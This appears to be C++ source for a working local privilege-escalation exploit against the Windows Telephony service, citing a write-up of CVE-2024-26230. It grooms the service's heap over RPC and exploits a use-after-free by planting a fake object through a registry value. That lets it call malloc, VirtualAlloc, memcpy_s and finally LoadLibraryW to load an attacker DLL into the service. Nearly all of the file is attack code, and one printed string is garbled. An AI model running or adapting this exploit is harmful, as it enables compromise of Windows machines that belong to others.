#include <Windows.h>
#include <rpc.h>
#include <cstdio>
#include <iostream>
#include <cstddef>
#include <rpcndr.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <map>
#include "RpcHelper.h"
#include "tapsrv_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")

void __RPC_FAR* __RPC_USER MIDL_user_allocate(size_t len)
{
	return malloc(len);
}
void __RPC_USER MIDL_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}

// GaFuncs
enum GaFuncs : uint32_t {
    GetAsyncEvents = 0,
    GetUIDllName,
    TUISPIDLLCallback,
    FreeDialogInstance,
    LAccept,
    LAddToConference,
    LAgentSpecific,
    LAnswer,
    LBlindTransfer,
    LClose,
    LCompleteCall,
    LCompleteTransfer,
    LDeallocateCall,
    LDevSpecific,
    LDevSpecificFeature,
    LDial,
    LDrop,
    LForward,
    LGatherDigits,
    LGenerateDigits,
    LGenerateTone,
    LGetAddressCaps,
    LGetAddressID,
    LGetAddressStatus,
    LGetAgentActivityList,
    LGetAgentCaps,
    LGetAgentGroupList,
    LGetAgentStatus,
    LGetAppPriority,
    LGetCallAddressID,
    LGetCallInfo,
    LGetCallStatus,
    LGetConfRelatedCalls,
    LGetCountry,
    LGetDevCaps,
    LGetDevConfig,
    LGetIcon,
    LGetID,
    LGetLineDevStatus,
    LGetNewCalls,
    LGetNumAddressIDs,
    LGetNumRings,
    LGetProviderList,
    LGetRequest,
    LGetStatusMessages,
    LHandoff,
    LHold,
    LInitialize,
    LMakeCall,
    LMonitorDigits,
    LMonitorMedia,
    LMonitorTones,
    LNegotiateAPIVersion,
    LNegotiateExtVersion,
    LOpen,
    LPark,
    LPickup,
    LPrepareAddToConference,
    LProxyMessage,
    LProxyResponse,
    LRedirect,
    LRegisterRequestRecipient,
    LReleaseUserUserInfo,
    LRemoveFromConference,
    LSecureCall,
    LSendUserUserInfo,
    LSetAgentActivity,
    LSetAgentGroup,
    LSetAgentState,
    LSetAppPriority,
    LSetAppSpecific,
    LSetCallData,
    LSetCallParams,
    LSetCallPrivilege,
    LSetCallQualityOfService,
    LSetCallTreatment,
    LSetDefaultMediaDetection,
    LSetDevConfig,
    LSetLineDevStatus,
    LSetMediaControl,
    LSetMediaMode,
    LSetNumRings,
    LSetStatusMessages,
    LSetTerminal,
    LSetupConference,
    LSetupTransfer,
    LShutdown,
    LSwapHold,
    LUncompleteCall,
    LUnhold,
    LUnpark,
    PClose,
    PDevSpecific,
    PGetButtonInfo,
    PGetData,
    PGetDevCaps,
    PGetDisplay,
    PGetGain,
    PGetHookSwitch,
    PGetID,
    PGetIcon,
    PGetLamp,
    PGetRing,
    PGetStatus,
    PGetStatusMessages,
    PGetVolume,
    PInitialize,
    POpen,
    PNegotiateAPIVersion,
    PNegotiateExtVersion,
    PSetButtonInfo,
    PSetData,
    PSetDisplay,
    PSetGain,
    PSetHookSwitch,
    PSetLamp,
    PSetRing,
    PSetStatusMessages,
    PSetVolume,
    PShutdown,
    TRequestDrop,
    TRequestMakeCall,
    TReadLocations,
    TWriteLocations,
    TAllocNewID,
    TPerformance,
    LConditionalMediaDetection,
    LSelectExtVersion,
    PSelectExtVersion,
    NegotiateAPIVersionForAllDevices,
    MGetAvailableProviders,
    MGetLineInfo,
    MGetPhoneInfo,
    MGetServerConfig,
    MSetLineInfo,
    MSetPhoneInfo,
    MSetServerConfig,
    LMSPIdentify,
    LReceiveMSPData,
    LGetCallHubTracking,
    LGetCallIDs,
    LGetHubRelatedCalls,
    LSetCallHubTracking,
    PrivateFactoryIdentify,
    LDevSpecificEx,
    LCreateAgent,
    LCreateAgentSession,
    LGetAgentInfo,
    LGetAgentSessionInfo,
    LGetAgentSessionList,
    LGetQueueInfo,
    LGetGroupList,
    LGetQueueList,
    LSetAgentMeasurementPeriod,
    LSetAgentSessionState,
    LSetQueueMeasurementPeriod,
    LSetAgentStateEx,
    LGetProxyStatus,
    LCreateMSPInstance,
    LCloseMSPInstance,
    TSetEventMasksOrSubMasks,
    TGetEventMasksOrSubMasks,
    TSetPermissibleMasks,
    TGetPermissibleMasks,
    MGetDeviceFlags,
    LGetCountryGroups,
    LGetIDEx,
    PGetIDEx
};

// exploit
void write_func_offset(void* buffer, uint32_t offset) {
    *(int*)buffer = offset;
}

void write_param(void* buffer, uint32_t n, int value) {
    *((int*)buffer + 1 + n) = value; // write int 8 bytes to buffer
}

int read_param(void* buffer, uint32_t n) {
    return *((int*)buffer + 1 + n);
}
int create_gold(PCONTEXT_HANDLE_TYPE& context) { // call GetUIDllName to create "GOLD" object
	uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t GetUIDllName_Offset = GaFuncs::GetUIDllName;

    // ClienRequest took input RPC buffer
    // The buffer[0] is always the offset in gaFuncs table of the function you want to call, for example, GetUIDllName is 1.
    // Next is parameters for that function. It's extracted as an array in the code of the function, so you have to reverse each function to understand
    // It's 4 bytes each, remember this.
    write_func_offset((void*)buffer, GaFuncs::GetUIDllName); // first one at 0th is always offset of the dispatch functions in gaFuncs table
    write_param((void*)buffer, 1, 1); // param1_GetUIDllName
    write_param((void*)buffer, 2, 3); // param2_GetUIDllName
    write_param((void*)buffer, 5, -1); // param5_GetUIDllName

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);

	return read_param((void *)buffer, 7); // return object id after created
}

int free_gold(PCONTEXT_HANDLE_TYPE& context, int gold_id) {
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t FreeDialogInstance_Offset = GaFuncs::FreeDialogInstance;
    write_func_offset((void *)buffer, FreeDialogInstance_Offset);
    write_param((void*)buffer, 1, gold_id);

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);

    return 0;
}

//-------------------------------------------------------------------------------------------
// k0shl pseudo-code https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230
//RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall");
//RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hkey);
//BYTE lpbuffer[0x5e] = { 0 };
//*(PDWORD)((ULONG_PTR)lpbuffer + 0xE) = (DWORD)0x40000018;
//*(PULONG_PTR)((ULONG_PTR)lpbuffer + 0x1E) = (ULONG_PTR)jmpaddr; // fake pointer
//RegSetValueExW(hkey, L"RequestMakeCall", 0, REG_BINARY, lpbuffer, 0x5E);

void uaf_malloc(PCONTEXT_HANDLE_TYPE& context) {
    // Create fake object with Registry Key RequestMakeCall
    HKEY hKey = NULL;
    if (!RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall")) { // delete old RequestMakeCall to create new one
        if (!RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hKey)) {
            BYTE lpData[0x5e] = { 0 };

            HMODULE hModule = GetModuleHandle(L"msvcrt.dll");
            void* pFunc = GetProcAddress(hModule, "malloc");

            *(PDWORD)((uint64_t)lpData + 0xE) = 0x40000018;
            *(PULONG_PTR)((ULONG_PTR)lpData + 0x1E) = (uint64_t)pFunc;

            RegSetValueExW(hKey, L"RequestMakeCall", 0, REG_BINARY, lpData, 0x5E);
        }
    }

    // Craft RPC request call TRequestMakeCall to trigger the allocation
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TRequestMakeCall_Offset = GaFuncs::TRequestMakeCall;
    write_func_offset((void*)buffer, TRequestMakeCall_Offset);
    //write_param((void*)buffer, 1, 0x40000018); // magic number
    //write_param((void*)buffer, 2, 3); // constant value for case 3

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);
}

DWORD trigger_uaf(PCONTEXT_HANDLE_TYPE& context) {
    // Craft RPC request call TUISPIDLLCallback to trigger the call to virtual function in dangling pointer
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TUISPIDLLCallback_Offset = GaFuncs::TUISPIDLLCallback;

    write_func_offset((void*)buffer, TUISPIDLLCallback_Offset);
    write_param((void*)buffer, 1, 0x40000018);
    write_param((void*)buffer, 2, 3);

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);

    DWORD leak = *(int*)((void*)buffer);
    return leak;
}

void uaf_virtualalloc(PCONTEXT_HANDLE_TYPE& context) {
    // Create fake object with Registry Key RequestMakeCall
    HKEY hKey = NULL;
    if (!RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall")) { // delete old RequestMakeCall to create new one
        if (!RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hKey)) {
            BYTE lpData[0x5e] = { 0 };

            HMODULE hModule = GetModuleHandle(L"KERNELBASE.dll");
            void* pFunc = GetProcAddress(hModule, "VirtualAlloc");

            *(PDWORD)((uint64_t)lpData + 0xE) = 0x40000018;
            *(PULONG_PTR)((ULONG_PTR)lpData + 0x1E) = (uint64_t)pFunc;

            RegSetValueExW(hKey, L"RequestMakeCall", 0, REG_BINARY, lpData, 0x5E);
        }
    }

    // Craft RPC request call TRequestMakeCall to trigger the allocation
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TRequestMakeCall_Offset = GaFuncs::TRequestMakeCall;
    write_func_offset((void*)buffer, TRequestMakeCall_Offset);
    //write_param((void*)buffer, 1, 0x40000018); // magic number
    //write_param((void*)buffer, 2, 3); // constant value for case 3

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);
}

void trigger_uaf_virtualalloc(PCONTEXT_HANDLE_TYPE& context, int leaked_address) {
    int buffer_size = 0x40000000;
    void* buffer = malloc(0x40000000);

    memset(buffer, 0, 0x40000000);

    uint32_t TUISPIDLLCallback_Offset = GaFuncs::TUISPIDLLCallback;

    write_func_offset((void*)buffer, TUISPIDLLCallback_Offset);
    write_param((void*)buffer, 1, 0x40000018); // arg1 of virtualalloc - mem address
    write_param((void*)buffer, 2, 3); // arg2 of virtualalloc - type

    write_param((void*)buffer, 3, leaked_address); //  3rd argument is flAllocationType MEM_COMMIT(0x1000) | MEM_RESERVE(0x2000)
    write_param((void*)buffer, 4, 0x40); // DWORD

    LONG byteWritten = 60;
    ClientRequest(context, (unsigned char*)buffer, 0x40000000, &byteWritten); // set 3rd param to 0x40000000 for predictable address
}

void uaf_memcpy_s(PCONTEXT_HANDLE_TYPE& context, int magic) {
    // Create fake object with Registry Key RequestMakeCall
    HKEY hKey = NULL;
    if (!RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall")) { // delete old RequestMakeCall to create new one
        if (!RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hKey)) {
            BYTE lpData[0x5e] = { 0 };

            HMODULE hModule = GetModuleHandle(L"msvcrt.dll");
            void* pFunc = GetProcAddress(hModule, "memcpy_s");

            *(PDWORD)((uint64_t)lpData + 0xE) = magic;
            *(PULONG_PTR)((ULONG_PTR)lpData + 0x1E) = (uint64_t)pFunc;

            RegSetValueExW(hKey, L"RequestMakeCall", 0, REG_BINARY, lpData, 0x5E);
        }
    }

    // Craft RPC request call TRequestMakeCall to trigger the allocation
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TRequestMakeCall_Offset = GaFuncs::TRequestMakeCall;
    write_func_offset((void*)buffer, TRequestMakeCall_Offset);
    //write_param((void*)buffer, 1, 0x40000018); // magic number
    //write_param((void*)buffer, 2, 3); // constant value for case 3

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);
}

void uaf_loadlibraryw(PCONTEXT_HANDLE_TYPE& context) {
    HKEY hKey = NULL;
    if (!RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall")) { // delete old RequestMakeCall to create new one
        if (!RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hKey)) {
            BYTE lpData[0x5e] = { 0 };

            HMODULE hModule = GetModuleHandle(L"KERNELBASE.dll");
            void* pFunc = GetProcAddress(hModule, "LoadLibraryW");

            *(PDWORD)((uint64_t)lpData + 0xE) = 0x40000018;
            *(PULONG_PTR)((ULONG_PTR)lpData + 0x1E) = (uint64_t)pFunc;

            RegSetValueExW(hKey, L"RequestMakeCall", 0, REG_BINARY, lpData, 0x5E);
        }
    }
    // Craft RPC request call TRequestMakeCall to trigger the allocation
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TRequestMakeCall_Offset = GaFuncs::TRequestMakeCall;
    write_func_offset((void*)buffer, TRequestMakeCall_Offset);
    //write_param((void*)buffer, 1, 0x40000018); // magic number
    //write_param((void*)buffer, 2, 3); // constant value for case 3

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);

}

DWORD trigger_uaf_loadlibraryw(PCONTEXT_HANDLE_TYPE& context) {
    uint8_t buffer[1024];
    memset(buffer, 0x00, 1024);

    uint32_t TUISPIDLLCallback_Offset = GaFuncs::TUISPIDLLCallback;

    write_func_offset((void*)buffer, TUISPIDLLCallback_Offset);
    write_param((void*)buffer, 1, 0x40000018); // virtualalloc_addr
    write_param((void*)buffer, 2, 3);

    LONG byteWritten = (sizeof(buffer) / sizeof(*buffer));
    ClientRequest(context, buffer, 1024, &byteWritten);

    DWORD leak = *(int*)((void*)buffer);
    return leak;
}
//-------------------------------------------------------------------------------------------
void run_exploit() {
	PCONTEXT_HANDLE_TYPE context = NULL;
	long AsyncEventsEvent{ 0 };

	DWORD id = GetCurrentProcessId();
	//std::cout << id << std::endl;

	// Create the heap fengshui context handle
	if (ClientAttach(&context, (long)id, &AsyncEventsEvent, L"user01", (wchar_t*)L"DESKTOP-L6C3788")) { //DESKTOP-KLBTA9J
		std::cout << "ClientAttach normal error\n";
	}
    
    std::cout << "- Sucessfully created normal context handle\n";
    
    // Step 1. Create GOLD object using GetUIDLLName
    int ret1 = create_gold(context);
    int ret2 = create_gold(context);
    int ret3 = create_gold(context);
    int ret4 = create_gold(context);
    int ret5 = create_gold(context);
    int ret6 = create_gold(context);

    // ITS IMPORTANT TO CREATE GOLD OBJECT BEFORE WE CREATE THE WORKER CONTEXT HANDLE
    // Create the worker context handle for uaf
    PCONTEXT_HANDLE_TYPE worker_context = NULL;
    AsyncEventsEvent = 0;
    if (ClientAttach(&worker_context, (long)id, &AsyncEventsEvent, L"kuqad", (wchar_t*)L"DESKTOP-KLBTA9J")) { //DESKTOP-KLBTA9J
        std::cout << "ClientAttach worker error\n";
    }

    std::cout << "- Sucessfully created worker context handle\n";

    // Step 2. Free the "GOLD" object to create HOLE
    free_gold(context, ret5);

    // Step 3. Create & free the worker "GOLD" object
    int ret7 = create_gold(worker_context);
    free_gold(context, ret7);

    // Step 4. Set-up UAF to call malloc
    uaf_malloc(context);

    // Leak lower 32bit address through returned value in TUISPIDLLCallback after invoke the virtual function
    int leaked_addr = 0;
    while (true) { // keep calling malloc until we got 0xXXXXXX3000 for 3rd VirtualAlloc argument
        DWORD leak = trigger_uaf(worker_context); // actually trigger the call to malloc
        printf("- Leak low 32bit address: 0x%x\n", leak);
        if (leak + 0x40100000 >= 0xc0000000) {
            leaked_addr = 0x100003000 - leak - 60 - 0x40100000; // 60 = 0x3c offset
            printf("0x%x\n", leaked_addr); // finally calculated the offset needed
            break;
        }
    }

    // Step 5. Set-up UAF to call VirtualAlloc
    int ret8 = create_gold(context);
    free_gold(context, ret8);

    int ret9 = create_gold(worker_context);
    free_gold(context, ret9);
    uaf_virtualalloc(context);

    trigger_uaf_virtualalloc(worker_context, leaked_addr); // VirtualAlloc at 0x400000018 (RCX), with allocation type set to 0x3

    printf("- VirtualAlloc at 0x400000018\n");

    // Step 6. Set-up UAF to call memcpy_s to load our dll path to memory for LibraryW call later
    DWORD virtualalloc_addr = 0x40000018;

    int ret10, ret11;

    LPCWSTR dll_path = L"C:\\Users\\user01\\Desktop\\hack.dll";
    
    size_t size = wcslen(dll_path) * 2;
    size = (size + 3 - 1) / 3 * 3;
    int n = 0;
    int count = size / 3;

    while (n < count) { // Copy 3 chars at a time
        ret10 = create_gold(context);
        free_gold(context, ret10);

        ret11 = create_gold(worker_context);
        free_gold(worker_context, ret11);

        int addr = virtualalloc_addr + n * 3;

        // Prepare UAF for memcpy_s
        uaf_memcpy_s(context, addr);

        // Trigger UAF in TUISPIDLLCallback with 3 bytes from dll_path each time
        uint8_t buffer[1024];
        memset(buffer, 0x00, 1024);
        
        uint32_t TUISPIDLLCallback_Offset = GaFuncs::TUISPIDLLCallback;

        write_func_offset((void*)buffer, TUISPIDLLCallback_Offset);
        write_param((void*)buffer, 1, virtualalloc_addr + n * 3); // Address to copy bytes to, 3 bytes at a time
        write_param((void*)buffer, 2, 3);
        write_param((void*)buffer, 4, 3);

        memcpy((void*)(buffer + 60), (const void*)((uint8_t*)dll_path + n * 3), 3);

        LONG byteWritten = 90;
        ClientRequest(worker_context, buffer, 1024 , &byteWritten);

        n += 1;
    }
    
    printf("- Successfully copied DLL PATH to 0x400000018\n");

    // Step 7. Invoke LoadLibrary at 0x400000018
    int ret12 = create_gold(context);
    free_gold(context, ret12);

    int ret13 = create_gold(worker_context);
    free_gold(context, ret13);
    
    // Prepare UAF for LoadLibrary
    uaf_loadlibraryw(context);

    DWORD output = trigger_uaf_loadlibraryw(worker_context);

    if (output == NULL) {
        std::cout << "LoadLibraryW returns NULL, failed to load dll\n";
    }
    else {
        std::cout << "LoadLibraryW succeed\n";
    }
}

int main() {
	// \\pipe\\tapsrv
	string_handle_bind("tapsrvlpc", tapsrv_IfHandle);

	if (tapsrv_IfHandle != NULL) {
		std::cout << "connect success\n";
	}

	RpcTryExcept{
		run_exploit();
	}
		RpcExcept(1) {
		printf("RPC ExceptiCAPSAX64DRVon %d\n", RpcExceptionCode());
	}
	RpcEndExcept;
	string_handle_unbind(tapsrv_IfHandle);

	return 0;
}